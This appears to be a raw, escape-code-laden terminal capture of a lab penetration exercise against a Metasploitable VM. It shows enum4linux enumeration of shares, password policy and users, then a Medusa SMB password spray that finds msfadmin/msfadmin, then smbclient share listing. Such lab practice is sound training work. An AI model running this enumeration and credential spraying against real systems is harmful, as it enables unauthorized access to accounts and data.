+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0m//192.168.56.102/print$   [01;33mESC[0m[35mMapping: [01;33mESC[0m[0mDENIED[01;33mESC[0m[35m Listing: [01;33mESC[0m[0mN/A[01;33mESC[0m[35m Writing: [01;33mESC[0m[0mN/A
+:[K[K [KESCESC[KOO[KBB[K//192.168.56.102/tmp    [01;33mESC[0m[35mMapping: [01;33mESC[0m[0mOK[01;33mESC[0m[35m Listing: [01;33mESC[0m[0mOK[01;33mESC[0m[35m Writing: [01;33mESC[0m[0mN/A
+:[K[K [KESCESC[KOO[KBB[K//192.168.56.102/opt    [01;33mESC[0m[35mMapping: [01;33mESC[0m[0mDENIED[01;33mESC[0m[35m Listing: [01;33mESC[0m[0mN/A[01;33mESC[0m[35m Writing: [01;33mESC[0m[0mN/A
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[33m
+:[K[K [KESCESC[KOO[KBB[K[E] [01;33mESC[0m[0m[01;33mESC[0m[31mCan't understand response:
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0mNT_STATUS_NETWORK_ACCESS_DENIED listing \*
+:[K[K [KESCESC[KOO[KBB[K//192.168.56.102/IPC$   [01;33mESC[0m[35mMapping: [01;33mESC[0m[0mN/A[01;33mESC[0m[35m Listing: [01;33mESC[0m[0mN/A[01;33mESC[0m[35m Writing: [01;33mESC[0m[0mN/A
+:[K[K [KESCESC[KOO[KBB[K//192.168.56.102/ADMIN$ [01;33mESC[0m[35mMapping: [01;33mESC[0m[0mDENIED[01;33mESC[0m[35m Listing: [01;33mESC[0m[0mN/A[01;33mESC[0m[35m Writing: [01;33mESC[0m[0mN/A
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[34m ===========================( [01;33mESC[0m[0m[01;33mESC[0m[32mPassword Policy Information for 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )===========================
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0m
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[+] Attaching to 192.168.56.102 using a NULL share
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[+] Trying protocol 139/SMB...
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[+] Found domain(s):
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        [+] METASPLOITABLE
+:[K[K [KESCESC[KOO[KBB[K        [+] Builtin
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[+] Password Info for Domain: METASPLOITABLE
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        [+] Minimum password length: 5
+:[K[K [KESCESC[KOO[KBB[K        [+] Password history length: None
+:[K[K [KESCESC[KOO[KBB[K        [+] Maximum password age: Not Set
+:[K[K [KESCESC[KOO[KBB[K        [+] Password Complexity Flags: 000000
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K                [+] Domain Refuse Password Change: 0
+:[K[K [KESCESC[KOO[KBB[K                [+] Domain Password Store Cleartext: 0
+:[K[K [KESCESC[KOO[KBB[K                [+] Domain Password Lockout Admins: 0
+:[K[K [KESCESC[KOO[KBB[K                [+] Domain Password No Clear Change: 0
+:[K[K [KESCESC[KOO[KBB[K                [+] Domain Password No Anon Change: 0
+:[K[K [KESCESC[KOO[KBB[K                [+] Domain Password Complex: 0
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        [+] Minimum password age: None
+:[K[K [KESCESC[KOO[KBB[K        [+] Reset Account Lockout Counter: 30 minutes 
+:[K[K [KESCESC[KOO[KBB[K        [+] Locked Account Duration: 30 minutes 
+:[K[K [KESCESC[KOO[KBB[K        [+] Account Lockout Threshold: None
+:[K[K [KESCESC[KOO[KBB[K        [+] Forced Log off Time: Not Set
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[33m
+:[K[K [KESCESC[KOO[KBB[K[+] [01;33mESC[0m[0m[01;33mESC[0m[32mRetieved partial password policy with rpcclient:
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0mPassword Complexity: Disabled
+:[K[K [KESCESC[KOO[KBB[KMinimum Password Length: 0
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[34m ======================================( [01;33mESC[0m[0m[01;33mESC[0m[32mGroups on 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )======================================
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0m[01;33mESC[0m[33m
+:[K[K [KESCESC[KOO[KBB[K[+] [01;33mESC[0m[0m[01;33mESC[0m[32mGetting builtin groups:
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0m[01;33mESC[0m[33m
+:[K[K [KESCESC[KOO[KBB[K[+] [01;33mESC[0m[0m[01;33mESC[0m[32m Getting builtin group memberships:
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0m[01;33mESC[0m[33m
+:[K[K [KESCESC[KOO[KBB[K[+] [01;33mESC[0m[0m[01;33mESC[0m[32m Getting local groups:
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0m[01;33mESC[0m[33m
+:[K[K [KESCESC[KOO[KBB[K[+] [01;33mESC[0m[0m[01;33mESC[0m[32m Getting local group memberships:
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0m[01;33mESC[0m[33m
+:[K[K [KESCESC[KOO[KBB[K[+] [01;33mESC[0m[0m[01;33mESC[0m[32m Getting domain groups:
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0m[01;33mESC[0m[33m
+:[K[K [KESCESC[KOO[KBB[K[+] [01;33mESC[0m[0m[01;33mESC[0m[32m Getting domain group memberships:
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0m
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[34m =================( [01;33mESC[0m[0m[01;33mESC[0m[32mUsers on 192.168.56.102 via RID cycling (RIDS: 500-550,1000-1050)[01;33mESC[0m[0m[01;33mESC[0m[34m )=================
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0m[01;33mESC[0m[33m
+:[K[K [KESCESC[KOO[KBB[K[I] [01;33mESC[0m[0m[01;33mESC[0m[36mFound new SID: 
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0mS-1-5-21-1042354039-2475377354-766472396
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[33m
+:[K[K [KESCESC[KOO[KBB[K[+] [01;33mESC[0m[0m[01;33mESC[0m[32mEnumerating users using SID S-1-5-21-1042354039-2475377354-766472396 and logon username '', password ''
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0mS-1-5-21-1042354039-2475377354-766472396-500 METASPLOITABLE\Administrator (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-501 METASPLOITABLE\nobody (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-512 METASPLOITABLE\Domain Admins (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-513 METASPLOITABLE\Domain Users (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-514 METASPLOITABLE\Domain Guests (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1000 METASPLOITABLE\root (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1001 METASPLOITABLE\root (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1002 METASPLOITABLE\daemon (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1003 METASPLOITABLE\daemon (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1004 METASPLOITABLE\bin (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1005 METASPLOITABLE\bin (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1006 METASPLOITABLE\sys (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1007 METASPLOITABLE\sys (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1008 METASPLOITABLE\sync (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1009 METASPLOITABLE\adm (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1010 METASPLOITABLE\games (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1011 METASPLOITABLE\tty (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1012 METASPLOITABLE\man (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1013 METASPLOITABLE\disk (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1014 METASPLOITABLE\lp (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1015 METASPLOITABLE\lp (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1016 METASPLOITABLE\mail (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1017 METASPLOITABLE\mail (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1018 METASPLOITABLE\news (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1019 METASPLOITABLE\news (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1020 METASPLOITABLE\uucp (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1021 METASPLOITABLE\uucp (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1025 METASPLOITABLE\man (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1026 METASPLOITABLE\proxy (Local User)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1027 METASPLOITABLE\proxy (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1031 METASPLOITABLE\kmem (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1041 METASPLOITABLE\dialout (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1043 METASPLOITABLE\fax (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1045 METASPLOITABLE\voice (Domain Group)
+:[K[K [KESCESC[KOO[KBB[KS-1-5-21-1042354039-2475377354-766472396-1049 METASPLOITABLE\cdrom (Domain Group)
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[34m ==============================( [01;33mESC[0m[0m[01;33mESC[0m[32mGetting printer info for 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )==============================
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0mNo printers returned.
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[Kenum4linux complete on Fri Nov 28 21:01:18 2025
+:[K[K [KESCESC[KOO[KBB[K
+[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[KOO[KBB[K[K[01;33m(END)[0m[K[K [KESCESC[K::[K[01;33m(END)[0m[K[K [KESCESC[KESCESC[K[K[01;33m(END)[0m[K[K [KESCESC[KESCESC[K [KESCESC[KESCESC[K[K[01;33m(END)[0m[K[K [K::[Kqq[K[?1l>[?1049l[23;0;0t                                                                                                                                                                                                                                            ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hecho -e "user\nmsfadmin\nservice" > smb_users.txt[49D[36me[36mc[36mh[36mo[39m [32m-[32me[39m [33m"[33mu[33ms[33me[33mr[33m\[33mn[33mm[33ms[33mf[33ma[33md[33mm[33mi[33mn[33m\[33mn[33ms[33me[33mr[33mv[33mi[33mc[33me[33m"[39m [1m[34m>[0m[39m[14C[?1l>[?2004l
+                                                                                                                                                                                                                                            ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hecho -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt[67D[36me[36mc[36mh[36mo[39m [32m-[32me[39m [33m"[33mp[33ma[33ms[33ms[33mw[33mo[33mr[33md[33m\[33mn[33m1[33m2[33m3[33m4[33m5[33m6[33m\[33mn[33mW[33me[33ml[33mc[33mo[33mm[33me[33m1[33m2[33m3[33m\[33mn[33mm[33ms[33mf[33ma[33md[33mm[33mi[33mn[33m"[39m [1m[34m>[0m[39m[17C[?1l>[?2004l
+                                                                                                                                                                                                                                            ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hmedusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50[81D[36mm[36me[36md[36mu[36ms[36ma[39m [32m-[32mh[39m[16C[32m-[32mU[39m [1ms[1mm[1mb[1m_[1mu[1ms[1me[1mr[1ms[1m.[1mt[1mx[1mt[0m [32m-[32mP[39m [1ms[1me[1mn[1mh[1ma[1ms[1m_[1ms[1mp[1mr[1ma[1my[1m.[1mt[1mx[1mt[0m [32m-[32mM[39m[7C[32m-[32mt[39m[3C[32m-[32mT[39m[3C[?1l>[?2004l
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: 123456 (1 of 4 complete)
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: password (2 of 4 complete)
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: Welcome123 (3 of 4 complete)
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 1 complete) Password: msfadmin (4 of 4 complete)
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: password (1 of 4 complete)
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: 123456 (2 of 4 complete)
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: Welcome123 (3 of 4 complete)
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 3, 2 complete) Password: msfadmin (4 of 4 complete)
+2025-11-28 21:17:32 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: password (1 of 4 complete)
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: Welcome123 (2 of 4 complete)
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: 123456 (3 of 4 complete)
+2025-11-28 21:17:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (3 of 3, 4 complete) Password: msfadmin (4 of 4 complete)
+                                                                                                                                                                                                                                            ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hsmbclient -L //192.168.56.102 -U msfadmin[41D[36ms[36mm[36mb[36mc[36ml[36mi[36me[36mn[36mt[39m [32m-[32mL[39m[18C[32m-[32mU[39m[9C[?1l>[?2004l
+Password for [WORKGROUP\msfadmin]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk      
+	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+	msfadmin        Disk      Home Directories
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            METASPLOITABLE
+                                                                                                                                                                                                                                            ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hexit
+[K[A[4C[36me[36mx[36mi[36mt[39m[1B[K[?1l>[?2004l
+
+Script done on 2025-11-28 21:28:06-03:00 [COMMAND_EXIT_CODE="0"]
